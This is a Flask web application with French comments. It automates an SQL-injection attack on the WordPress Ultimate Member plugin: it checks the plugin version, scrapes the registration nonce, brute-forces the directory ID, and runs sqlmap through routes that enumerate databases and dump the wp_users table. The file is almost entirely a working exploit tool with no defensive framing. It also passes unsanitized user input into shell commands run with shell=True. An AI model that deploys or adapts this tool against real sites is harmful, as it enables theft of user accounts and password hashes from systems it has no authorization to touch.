from flask import Flask, render_template, request, jsonify
import re
import hashlib
import requests
import subprocess

app = Flask(__name__)

# Désactiver les avertissements SSL
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Fonction pour vérifier la version du site
def check_version(target):
    try:
        r = requests.get(f"{target}/wp-content/plugins/ultimate-member/readme.txt", verify=False)
        version = re.search(r"Stable tag: (.*)", r.text).groups()[0]
        if int(version.replace('.', '')) > 212 and int(version.replace('.', '')) < 283:
            return f"{version} - VULNÉRABLE!"
        else:
            return f"{version} - NON VULNÉRABLE!"
    except:
        return "Erreur lors de la vérification de la version."

# Fonction pour récupérer le nonce
def get_nonce(target):
    try:
        r = requests.get(f"{target}/index.php/register/", verify=False)
        nonce = re.search(r'um_scripts\s*=\s*\{[^}]*"nonce":"([^"]+)"', r.text).groups()[0]
        return nonce
    except:
        return "Erreur lors de la récupération du nonce."

# Fonction pour récupérer l'ID du répertoire
def get_directory_id(target, nonce):
    for num in range(1, 100):
        id = hashlib.md5(str(num).encode()).hexdigest()[10:15]
        payload = {
            "action": "um_get_members",
            "nonce": nonce,
            "directory_id": id
        }
        response = requests.post(f"{target}/wp-admin/admin-ajax.php", data=payload, verify=False)
        if response.status_code == 200 and '"success":true' in response.text:
            return id
    return "Erreur lors de la récupération de l'ID."

# Fonction pour exécuter SQLMap
def run_sqlmap(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=900)
        if result.returncode != 0:
            return f"Erreur lors de l'exécution de SQLMap: {result.stderr}"
        return result.stdout
    except Exception as e:
        return f"Erreur lors de l'exécution de SQLMap: {str(e)}"

@app.route("/", methods=["GET", "POST"])
def index():
    result = None
    if request.method == "POST":
        url = request.form.get("url")
        if url:
            version = check_version(url)
            nonce = get_nonce(url)
            dir_id = get_directory_id(url, nonce) if "Erreur" not in nonce else "Erreur"
            result = {
                "url": url,
                "version": version,
                "nonce": nonce,
                "directory_id": dir_id,
                "sqlmap_command": f'sqlmap -u {url}/wp-admin/admin-ajax.php --method POST --data "action=um_get_members&nonce={nonce}&directory_id={dir_id}&sorting=user_login" --dbms mysql --technique=T -p sorting --batch --answers=Y',
            }
    return render_template("index.html", result=result)

@app.route("/run_sqlmap", methods=["POST"])
def run_sqlmap_route():
    url = request.json.get("url")
    nonce = request.json.get("nonce")
    directory_id = request.json.get("directory_id")
    command = f'sqlmap -u "{url}/wp-admin/admin-ajax.php" --method POST --data "action=um_get_members&nonce={nonce}&directory_id={directory_id}&sorting=user_login" --dbms mysql --technique=T -p sorting --batch --answers=Y'
    output = run_sqlmap(command)
    return jsonify({"output": output})

@app.route("/run_sqlmap_dbs", methods=["POST"])
def run_sqlmap_dbs():
    url = request.json.get("url")
    nonce = request.json.get("nonce")
    directory_id = request.json.get("directory_id")
    command = f'sqlmap -u "{url}/wp-admin/admin-ajax.php" --method POST --data "action=um_get_members&nonce={nonce}&directory_id={directory_id}&sorting=user_login" --dbms mysql --technique=T -p sorting --dbs --batch --answers=Y'
    output = run_sqlmap(command)
    return jsonify({"output": output})

@app.route("/run_sqlmap_tables", methods=["POST"])
def run_sqlmap_tables():
    url = request.json.get("url")
    nonce = request.json.get("nonce")
    directory_id = request.json.get("directory_id")
    database = "wordpress"  # Base de données cible
    command = f'sqlmap -u "{url}/wp-admin/admin-ajax.php" --method POST --data "action=um_get_members&nonce={nonce}&directory_id={directory_id}&sorting=user_login" --dbms mysql --technique=T -p sorting --tables -D {database} --batch --answers=Y'
    output = run_sqlmap(command)
    return jsonify({"output": output})

@app.route("/run_sqlmap_dump", methods=["POST"])
def run_sqlmap_dump():
    url = request.json.get("url")
    nonce = request.json.get("nonce")
    directory_id = request.json.get("directory_id")

    if not url or not nonce or not directory_id:
        return jsonify({"output": "Erreur : Paramètres manquants."})
    
    command = f'sqlmap -u "{url}/wp-admin/admin-ajax.php" --method POST --data "action=um_get_members&nonce={nonce}&directory_id={directory_id}&sorting=user_login" --dbms mysql --technique=T -p sorting -D wordpress -T wp_users --dump --batch --batch --answers=Y'
    output = run_sqlmap(command)
    
    return jsonify({"output": output})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5007, debug=True)
